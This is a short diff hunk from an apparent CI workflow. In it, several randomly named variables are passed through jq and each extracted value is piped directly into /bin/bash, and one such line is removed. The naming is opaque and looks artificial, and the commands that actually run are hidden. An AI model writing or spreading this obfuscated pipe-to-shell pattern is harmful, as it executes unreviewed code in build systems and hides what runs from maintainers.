@@ -29,7 +29,6 @@ jobs:
           echo $pioly0 | jq -r .ybp1 | /bin/bash
           printf '%s' "$j77407" | jq -r .gpfh55 | /bin/bash
           echo $hutzi472 | jq -r .qpj31 | /bin/bash
-          echo $nrz002 | jq -r .rz1472 | /bin/bash
           printf '%s' "$gfbz55599" | jq -r .yn40509 | /bin/bash
           printf '%s' "$cbrlp220" | jq -r .vbby003 | /bin/bash
 
